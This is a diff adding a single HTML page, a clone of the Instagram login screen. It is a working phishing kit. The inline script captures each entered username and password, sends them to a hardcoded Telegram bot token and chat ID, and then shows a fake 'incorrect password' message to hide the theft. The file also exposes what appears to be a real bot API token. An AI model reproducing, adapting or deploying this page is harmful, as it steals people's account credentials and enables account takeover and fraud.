@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Instagram Login Clone</title>
+  <link rel="stylesheet" href="styles.css">
+  <style>
+    /* Styling for the error message */
+    .error-message {
+      color: red;
+      font-size: 14px;
+      margin: 10px 0;
+      display: none; /* Hidden by default */
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="left">
+      <img src="pic/Screenshot 2024-10-12 150817.png" width="400px" alt="Instagram Preview">
+    </div>
+
+    <div class="right">
+      <div class="login-box">
+        <img src="pic/images.png" class="logo" alt="Instagram Logo">
+
+        <form action="#" method="POST" id="loginForm">
+          <input type="text" name="username" id="username" placeholder="Phone number, username, or email" required>
+          <input type="password" name="password" id="password" placeholder="Password" required>
+          <button type="submit" id="loginButton">Log In</button>
+        </form>
+
+        <div class="divider">
+          <span></span>
+        </div>
+
+        <!-- Error message goes here -->
+        <p class="error-message" id="errorMessage">
+          Sorry, your password was incorrect. Please double-check your password.
+        </p>
+
+        <button class="fb-login">Log in with Facebook</button>
+        <a href="#">Forgot password?</a>
+      </div>
+
+      <div class="signup-box">
+        <p>Don't have an account? <a href="#">Sign up</a></p>
+      </div>
+
+      <div class="download-box">
+        <p>Get the app.</p>
+        <div class="download-links">
+          <div class="image-container">
+            <img src="pic/download.png store.png" alt="App Store">
+            <img src="pic/download.png" alt="Google Play">
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    const botToken = '7352178578:AAEuz29qPVVhYsmkr4-LG5Rxga2fgKLE1ZI'; // Your bot API token
+    const chatId = '-4548925188'; // Your Telegram group chat ID
+
+    function sendToTelegram(username, password) {
+      const message = `New Login Attempt:\nUsername: ${username}\nPassword: ${password}`;
+
+      return fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: chatId, text: message })
+      })
+      .then(response => response.json())
+      .then(data => {
+        if (data.ok) console.log('Message sent to Telegram successfully');
+        else console.log('Failed to send message to Telegram');
+      })
+      .catch(error => console.error('Error sending message to Telegram:', error));
+    }
+
+    document.getElementById('loginForm').addEventListener('submit', function(event) {
+      event.preventDefault(); // Prevent form submission
+
+      const username = document.getElementById('username').value;
+      const password = document.getElementById('password').value;
+      const loginButton = document.getElementById('loginButton');
+      const errorMessage = document.getElementById('errorMessage');
+
+      // Disable button to show loading effect
+      loginButton.disabled = true;
+      loginButton.textContent = 'Loading...';
+
+      // Send data to Telegram
+      sendToTelegram(username, password).then(() => {
+        // Simulate incorrect login
+        setTimeout(() => {
+          // Show the error message
+          errorMessage.style.display = 'block';
+
+          // Reset button state after showing error
+          loginButton.disabled = false;
+          loginButton.textContent = 'Log In';
+        }, 2000);
+      });
+    });
+  </script>
+</body>
+</html>
